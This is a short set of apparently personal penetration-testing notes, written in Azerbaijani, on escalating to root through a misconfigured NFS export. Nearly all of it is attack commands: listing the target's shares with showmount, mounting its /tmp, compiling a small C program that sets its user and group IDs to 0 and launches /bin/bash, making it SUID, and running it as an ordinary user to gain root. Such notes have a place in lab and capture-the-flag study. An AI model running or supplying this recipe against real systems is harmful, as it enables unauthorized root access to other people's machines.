## ILK OLARAQ BIZ HEDEFIN NFS KIMI ICAZELERINE BAXIRIQ 
    showmount -e {ip adress}
## EGER ICAZELERI VARSA (MESELEN TMP QOVLUQU) ONDA
## oz mashinimizda root ile share qovluqu yaradiriq
     sudo mount  -t nfs ("ip adress"):/tmp /tmp/share
## ve hedefin tmp qovluqlarinda olan hershey bizde gorsenecek ve ilk olaraq /bin/bash qovluqunu 
     cp /bin/bash .
##  kopyalayib getiririk ve atack masinimizda buna suid icazesi verib kecirk roota     

## kalideki atack masinimiza kecirik
    echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > hasan.c
## daha sonra 
    gcc hasan.c -o hasan
## ve daha sonra hamisina chmod ile suid ve ex icazesi veririk 


## (user hissesi) daha sonra usere kecib 
    ./hasan -p
## runladiqdan sonra artiq roota kecmisik
